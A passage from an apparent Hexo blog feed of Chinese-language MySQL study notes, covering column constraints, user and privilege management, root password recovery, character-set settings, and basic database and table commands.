code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 drop index 唯一性约束名;<br></code></pre></div></td></tr></table></figure><h3 id="3-3-查看唯一性约束"><a href="#3-3-查看唯一性约束" class="headerlink" title="3.3 查看唯一性约束"></a>3.3 查看唯一性约束</h3><p>查看唯一性约束除可以使用 describe 命令外，还可以使用 show create table 表名；或者 show index from 表名； 来查看。</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">show create table 表名;<br>show index from 表名;<br></code></pre></div></td></tr></table></figure><h2 id="4-非空约束"><a href="#4-非空约束" class="headerlink" title="4.非空约束"></a>4.非空约束</h2><p>非空约束是指字段的值不能为 NULL ，在 MySQL 中，非空约束是通过 NOT NULL 定义的。</p><h3 id="4-1-创建非空约束"><a href="#4-1-创建非空约束" class="headerlink" title="4.1 创建非空约束"></a>4.1 创建非空约束</h3><h4 id="4-1-1-创建表时添加非空约束"><a href="#4-1-1-创建表时添加非空约束" class="headerlink" title="4.1.1 创建表时添加非空约束"></a>4.1.1 创建表时添加非空约束</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">字段名 数据类型 not null;<br></code></pre></div></td></tr></table></figure><h4 id="4-1-2-为已存在的表添加非空约束"><a href="#4-1-2-为已存在的表添加非空约束" class="headerlink" title="4.1.2 为已存在的表添加非空约束"></a>4.1.2 为已存在的表添加非空约束</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 modify 字段名 数据类型 not null;<br></code></pre></div></td></tr></table></figure><h3 id="4-2-删除非空约束"><a href="#4-2-删除非空约束" class="headerlink" title="4.2 删除非空约束"></a>4.2 删除非空约束</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 modify 字段名 数据类型;<br></code></pre></div></td></tr></table></figure><h2 id="5-检查约束"><a href="#5-检查约束" class="headerlink" title="5.检查约束"></a>5.检查约束</h2><h3 id="5-1-创建检查约束"><a href="#5-1-创建检查约束" class="headerlink" title="5.1 创建检查约束"></a>5.1 创建检查约束</h3><h4 id="5-1-1-创建表时添加检查约束"><a href="#5-1-1-创建表时添加检查约束" class="headerlink" title="5.1.1 创建表时添加检查约束"></a>5.1.1 创建表时添加检查约束</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">check(表达式) <br></code></pre></div></td></tr></table></figure><h4 id="5-1-2-为已存在的表添加检查约束"><a href="#5-1-2-为已存在的表添加检查约束" class="headerlink" title="5.1.2 为已存在的表添加检查约束"></a>5.1.2 为已存在的表添加检查约束</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 add [constraint 约束名] check(表达式);<br></code></pre></div></td></tr></table></figure><h3 id="5-2-删除检查约束"><a href="#5-2-删除检查约束" class="headerlink" title="5.2 删除检查约束"></a>5.2 删除检查约束</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 drop check 检查约束名;<br></code></pre></div></td></tr></table></figure><h2 id="6-默认值约束"><a href="#6-默认值约束" class="headerlink" title="6.默认值约束"></a>6.默认值约束</h2><h3 id="6-1-创建默认值约束"><a href="#6-1-创建默认值约束" class="headerlink" title="6.1 创建默认值约束"></a>6.1 创建默认值约束</h3><h4 id="6-1-1-创建表时添加默认值约束"><a href="#6-1-1-创建表时添加默认值约束" class="headerlink" title="6.1.1 创建表时添加默认值约束"></a>6.1.1 创建表时添加默认值约束</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">字段名 数据类型 default 默认值<br></code></pre></div></td></tr></table></figure><h4 id="6-1-2-为已存在的表添加默认值约束"><a href="#6-1-2-为已存在的表添加默认值约束" class="headerlink" title="6.1.2 为已存在的表添加默认值约束"></a>6.1.2 为已存在的表添加默认值约束</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 modify 字段名 数据类型 default 默认值;<br></code></pre></div></td></tr></table></figure><h3 id="6-2-删除默认值约束"><a href="#6-2-删除默认值约束" class="headerlink" title="6.2 删除默认值约束"></a>6.2 删除默认值约束</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 modify 字段名 数据类型;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>MySQL数据库</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL-MySQL知识复习（一）</title>
    <link href="/2021/06/03/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL-MySQL%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/06/03/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL-MySQL%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>MySQL是一个关系型数据库管理系统。简单复习数据库MySQL知识。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="0-数据库用户设置"><a href="#0-数据库用户设置" class="headerlink" title="0.数据库用户设置"></a>0.数据库用户设置</h2><h3 id="0-1-创建用户"><a href="#0-1-创建用户" class="headerlink" title="0.1 创建用户"></a>0.1 创建用户</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">create user 用户名@主机名 identified by &#39;密码&#39;;<br># 例如<br>create user loong@localhost identified by &#39;123&#39;;<br># 主机名是允许登录的主机名，可以写通配符表示 % 表示允许所有<br>create user loong@&#39;%&#39; identified by &#39;123&#39;;<br></code></pre></div></td></tr></table></figure><h3 id="0-2-删除用户"><a href="#0-2-删除用户" class="headerlink" title="0.2 删除用户"></a>0.2 删除用户</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">drop user 用户名@主机名;<br>drop user loong@localhost;<br>drop user loong@&#39;%&#39;;<br></code></pre></div></td></tr></table></figure><h3 id="0-3-修改用户密码"><a href="#0-3-修改用户密码" class="headerlink" title="0.3 修改用户密码"></a>0.3 修改用户密码</h3><blockquote><ol><li>方法一</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">update user set password &#x3D; password(&#39;新密码&#39;) where user &#x3D; &#39;用户名&#39;;<br># password 为给密码加密的函数<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>方法二</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">set password for 用户名@主机名 &#x3D; password(&#39;新密码&#39;);<br></code></pre></div></td></tr></table></figure><h3 id="0-4-root用户密码忘记"><a href="#0-4-root用户密码忘记" class="headerlink" title="0.4 root用户密码忘记"></a>0.4 root用户密码忘记</h3><blockquote><ol><li>先停止MySQL服务</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql"># CMD命令窗口（以管理员身份运行）<br>net stop mysql <br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>使用无验证方式启动MySQL服务</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">mysqld --skip-grant-tables<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>打开新的CMD窗口，直接输入命令：<code>mysql</code>，再回车就可以登录成功。</li></ol></blockquote><blockquote><ol start="4"><li>use mysql;</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">use mysql;<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>update user set password = password(‘新密码’) where user =’root’;</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">update user set password &#x3D; password(&#39;新密码&#39;) where user &#x3D;&#39;root&#39;;<br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>关闭两个窗口</li></ol></blockquote><blockquote><ol start="7"><li>打开任务管理器，手动结束<code>mysqld.exe</code>的进程。</li></ol></blockquote><blockquote><ol start="8"><li>启动MySQL服务。</li></ol></blockquote><blockquote><ol start="9"><li>使用新密码登录。 </li></ol></blockquote><h3 id="0-5-查询用户权限"><a href="#0-5-查询用户权限" class="headerlink" title="0.5 查询用户权限"></a>0.5 查询用户权限</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">show grants for 用户名@主机名;<br></code></pre></div></td></tr></table></figure><h3 id="0-6-授予权限"><a href="#0-6-授予权限" class="headerlink" title="0.6 授予权限"></a>0.6 授予权限</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">grant 权限列表 on 数据库名.表名 to 用户名@主机名;<br>grant all on *.* to 用户名@主机名;# 所有权限<br></code></pre></div></td></tr></table></figure><h3 id="0-7-撤销权限"><a href="#0-7-撤销权限" class="headerlink" title="0.7 撤销权限"></a>0.7 撤销权限</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">revoke 权限列表 on 数据库名.表名 from 用户名@主机名;<br></code></pre></div></td></tr></table></figure><h2 id="1-数据库的使用"><a href="#1-数据库的使用" class="headerlink" title="1.数据库的使用"></a>1.数据库的使用</h2><h3 id="1-1-MySQL服务启动和关闭"><a href="#1-1-MySQL服务启动和关闭" class="headerlink" title="1.1 MySQL服务启动和关闭"></a>1.1 MySQL服务启动和关闭</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">&#x2F;&#x2F;开启<br>net start mysql80 &#x2F;&#x2F;mysql80为服务器的默认名称<br><br>&#x2F;&#x2F;关闭<br>net stop mysql80<br></code></pre></div></td></tr></table></figure><h3 id="1-2-登录MySQL"><a href="#1-2-登录MySQL" class="headerlink" title="1.2 登录MySQL"></a>1.2 登录MySQL</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">mysql -h 服务器地址 -u 用户名 -p密码 &#x2F;&#x2F;-p与密码间没用空格，当是在本地时 -h 可以省略或者写localhost或127.0.0.1<br><br>mysql -u root -prootmm &#x2F;&#x2F;root 为用户名，rootmm 为命名，这种写法容易造成密码泄露<br><br>mysql -u root -p &#x2F;&#x2F;回车后再输入密码，这时输入的密码是加密后的<br></code></pre></div></td></tr></table></figure><h3 id="1-3-查看数据库字符集"><a href="#1-3-查看数据库字符集" class="headerlink" title="1.3 查看数据库字符集"></a>1.3 查看数据库字符集</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">show character set;<br></code></pre></div></td></tr></table></figure><blockquote><ol><li>MySQL字符集系统变量</li></ol></blockquote><table><thead><tr><th align="center">系统变量名</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">character_set_server</td><td align="center">服务器安装时指定的默认编码格式。服务器启动时通过该变量设置字符集。使用utf8mb4作为MySQL的默认字符集。</td></tr><tr><td align="center">character_set_client</td><td align="center">用来设置客户端使用的字符集。用来决定MySQL如何解释客户端发到服务端的SQL命令。</td></tr><tr><td align="center">character_set_connection</td><td align="center">用来设置连接数据库时的字符集。用来决定MySQL如何处理客户端发来的SQL命令。</td></tr><tr><td align="center">character_set_results</td><td align="center">数据库给客户端返回时使用的编码格式，当SQL返回结果时，这个变量的取值决定了发给客户端的字符编码。</td></tr><tr><td align="center">character_set_database</td><td align="center">用来设置默认创建数据库的编码格式，如果在创建数据库时没用设置编码格式，就按照这个默认字符集设置当前选中的数据库。</td></tr><tr><td align="center">character_set_system</td><td align="center">数据库系统使用的编码格式，这个值一直是utf8，不需要设置。它是为存储系统元数据的编码格式。数据库、表和字段都用这个字符集。</td></tr></tbody></table><h3 id="1-4-查看当前系统参数"><a href="#1-4-查看当前系统参数" class="headerlink" title="1.4 查看当前系统参数"></a>1.4 查看当前系统参数</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">shwo variables like &#39;char%&#39;;<br></code></pre></div></td></tr></table></figure><h3 id="1-5-修改系统参数"><a href="#1-5-修改系统参数" class="headerlink" title="1.5 修改系统参数"></a>1.5 修改系统参数</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">character_set_database&#x3D;utf8; &#x2F;&#x2F;其他类似，直接赋结果即可。<br></code></pre></div></td></tr></table></figure><p><strong>需要注意的是，这种修改方式只在当前客户端有效，关闭后就会恢复成默认值。若要永久性生效，则需要在配置文件 my.ini 中修改。</strong></p><h2 id="2-退出MySQL"><a href="#2-退出MySQL" class="headerlink" title="2.退出MySQL"></a>2.退出MySQL</h2><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">&#x2F;&#x2F;两种方法都行<br>exit <br>quit <br></code></pre></div></td></tr></table></figure><h2 id="3-数据库"><a href="#3-数据库" class="headerlink" title="3.数据库"></a>3.数据库</h2><h3 id="3-1-创建数据库（create）"><a href="#3-1-创建数据库（create）" class="headerlink" title="3.1 创建数据库（create）"></a>3.1 创建数据库（create）</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">create database 数据库名;<br></code></pre></div></td></tr></table></figure><h3 id="3-2-删除数据库（drop）"><a href="#3-2-删除数据库（drop）" class="headerlink" title="3.2 删除数据库（drop）"></a>3.2 删除数据库（drop）</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">drop database 数据库名;<br>drop database if exists 数据库名; &#x2F;&#x2F;如果存在此数据库才执行<br></code></pre></div></td></tr></table></figure><h3 id="3-3-选择数据库（use）"><a href="#3-3-选择数据库（use）" class="headerlink" title="3.3 选择数据库（use）"></a>3.3 选择数据库（use）</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">use 数据库名;<br></code></pre></div></td></tr></table></figure><h3 id="3-4-查看数据库（show）"><a href="#3-4-查看数据库（show）" class="headerlink" title="3.4 查看数据库（show）"></a>3.4 查看数据库（show）</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">show databases;<br></code></pre></div></td></tr></table></figure><h3 id="3-5-修改数据库（alter）"><a href="#3-5-修改数据库（alter）" class="headerlink" title="3.5 修改数据库（alter）"></a>3.5 修改数据库（alter）</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter database 数据库名 <br>default character set gb2312<br>default collate gb2312_chinese_ci;<br></code></pre></div></td></tr></table></figure><h3 id="3-6-显示数据库中所有表的信息"><a href="#3-6-显示数据库中所有表的信息" class="headerlink" title="3.6 显示数据库中所有表的信息"></a>3.6 显示数据库中所有表的信息</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">show table status from 数据库名;<br></code></pre></div></td></tr></table></figure><blockquote><p>表名以 loong 开头的表的信息</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">show table status from 数据库名 like &#39;loong&#39;;<br></code></pre></div></td></tr></table></figure><blockquote><p>查询结果按列打印</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">show table status from 数据库名 like &#39;loong&#39;\G;<br></code></pre></div></td></tr></table></figure><h2 id="4-表"><a href="#4-表" class="headerlink" title="4.表"></a>4.表</h2><h3 id="4-1-创建表（create）"><a href="#4-1-创建表（create）" class="headerlink" title="4.1 创建表（create）"></a>4.1 创建表（create）</h3><h4 id="4-1-1-常规创建"><a href="#4-1-1-常规创建" class="headerlink" title="4.1.1 常规创建"></a>4.1.1 常规创建</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">create table 表名(<br>字段名 字段类型<br>);<br></code></pre></div></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">create table loong(<br>   tutorial_id INT NOT NULL AUTO_INCREMENT comment &#39;编号&#39;,<br>   tutorial_title VARCHAR(100) NOT NULL,<br>   tutorial_author VARCHAR(40) NOT NULL,<br>   submission_date DATE,<br>   PRIMARY KEY ( tutorial_id )<br>);<br></code></pre></div></td></tr></table></figure><h4 id="4-1-2-复制其他表"><a href="#4-1-2-复制其他表" class="headerlink" title="4.1.2 复制其他表"></a>4.1.2 复制其他表</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">create table 表名1 [[like 表名2] | select 语句 ];<br></code></pre></div></td></tr></table></figure><h5 id="1-复制表结构"><a href="#1-复制表结构" class="headerlink" title="1. 复制表结构"></a>1. 复制表结构</h5><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">create table 表名1 like 表名2; &#x2F;&#x2F;表1复制表2的结构<br></code></pre></div></td></tr></table></figure><h5 id="2-复制表结构及数据"><a href="#2-复制表结构及数据" class="headerlink" title="2. 复制表结构及数据"></a>2. 复制表结构及数据</h5><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">create table 表名1 select * from 表名2;<br></code></pre></div></td></tr></table></figure><h3 id="4-2-删除表（drop）"><a href="#4-2-删除表（drop）" class="headerlink" title="4.2 删除表（drop）"></a>4.2 删除表（drop）</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">drop table [if exists] 表名;<br></code></pre></div></td></tr></table></figure><h3 id="4-3-查看表（show"><a href="#4-3-查看表（show" class="headerlink" title="4.3 查看表（show)"></a>4.3 查看表（show)</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">show tables;<br></code></pre></div></td></tr></table></figure><h3 id="4-4-修改表（alter）"><a href="#4-4-修改表（alter）" class="headerlink" title="4.4 修改表（alter）"></a>4.4 修改表（alter）</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 修改选项<br></code></pre></div></td></tr></table></figure><h4 id="4-4-1-添加字段（add）"><a href="#4-4-1-添加字段（add）" class="headerlink" title="4.4.1 添加字段（add）"></a>4.4.1 添加字段（add）</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 add 新字段名 数据类型 [约束条件] [first|after 已存在的字段名];<br></code></pre></div></td></tr></table></figure><ul><li>first：将新添加的字段设置为表的第一个字段；</li><li>after：将新添加的字段添加到指定的已存在字段名的后面。</li></ul><h4 id="4-4-2-修改字段数据类型（modify）"><a href="#4-4-2-修改字段数据类型（modify）" class="headerlink" title="4.4.2 修改字段数据类型（modify）"></a>4.4.2 修改字段数据类型（modify）</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 modify 字段名 新数据类型;<br></code></pre></div></td></tr></table></figure><h4 id="4-4-3-删除字段（drop）"><a href="#4-4-3-删除字段（drop）" class="headerlink" title="4.4.3 删除字段（drop）"></a>4.4.3 删除字段（drop）</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 drop 字段名;<br></code></pre></div></td></tr></table></figure><h4 id="4-4-4-修改字段名（change）"><a href="#4-4-4-修改字段名（change）" class="headerlink" title="4.4.4 修改字段名（change）"></a>4.4.4 修改字段名（change）</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 change 旧字段名 新字段名 新数据类型<br></code></pre></div></td></tr></table></figure><h4 id="4-4-5-修改表名（rename）"><a href="#4-4-5-修改表名（rename）" class="headerlink" title="4.4.5 修改表名（rename）"></a>4.4.5 修改表名（rename）</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 旧表名 rename [to] 新表名;<br></code></pre></div></td></tr></table></figure><ul><li>to：为可选参数，用否不影响。</li></ul><h3 id="4-5-查看表结构（desc）"><a href="#4-5-查看表结构（desc）" class="headerlink" title="4.5 查看表结构（desc）"></a>4.5 查看表结构（desc）</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">describe tablename; &#x2F;&#x2F;tablename 为表名，describe 也可以简写为 desc<br>desc tablename;<br><br>&#x2F;&#x2F;显示数据表的属性，属性类型，主键信息 ，是否为 NULL，默认值等其他信息。两则的效果差不多<br>show columns from 表名;<br></code></pre></div></td></tr></table></figure><h3 id="4-6-显示建表语句"><a href="#4-6-显示建表语句" class="headerlink" title="4.6 显示建表语句"></a>4.6 显示建表语句</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">show create table 表名;<br></code></pre></div></td></tr></table></figure><h3 id="4-7-表的数据操作"><a href="#4-7-表的数据操作" class="headerlink" title="4.7 表的数据操作"></a>4.7 表的数据操作</h3><h4 id="4-7-1-插入数据（insert-into）"><a href="#4-7-1-插入数据（insert-into）" class="headerlink" title="4.7.1 插入数据（insert into）"></a>4.7.1 插入数据（insert into）</h4><h5 id="1-指定字段插入数据"><a href="#1-指定字段插入数据" class="headerlink" title="1. 指定字段插入数据"></a>1. 指定字段插入数据</h5><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">insert into 表名(字段1，字段2，····，字段n)<br>value<br>(值1，值2，····，值n);<br></code></pre></div></td></tr></table></figure><h5 id="2-不指定字段插入数据"><a href="#2-不指定字段插入数据" class="headerlink" title="2. 不指定字段插入数据"></a>2. 不指定字段插入数据</h5><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">insert into 表名 value<br>(值1，值2，···，值n);<br></code></pre></div></td></tr></table></figure><p><strong>两者区别：</strong></p><ul><li>指定字段：可以不按照表中字段的顺序。</li><li>不指定字段：值的顺序必须与表中字段的顺序相同。</li></ul><h5 id="3-同时插入多条数据"><a href="#3-同时插入多条数据" class="headerlink" title="3. 同时插入多条数据"></a>3. 同时插入多条数据</h5><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">insert into 表名(字段1，字段2，····，字段n)<br>value<br>(值1，值2，···),<br>(值1，值2，···),<br>.......<br>(值1，值2，···);<br></code></pre></div></td></tr></table></figure><h5 id="4-将其他表的数据插入表中"><a href="#4-将其他表的数据插入表中" class="headerlink" title="4. 将其他表的数据插入表中"></a>4. 将其他表的数据插入表中</h5><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">insert into 表名1(字段1，字段2，····)<br>select 对应字段1，对应字段2，····<br>from 表名2;<br></code></pre></div></td></tr></table></figure><h4 id="4-7-2-修改数据"><a href="#4-7-2-修改数据" class="headerlink" title="4.7.2 修改数据"></a>4.7.2 修改数据</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">update 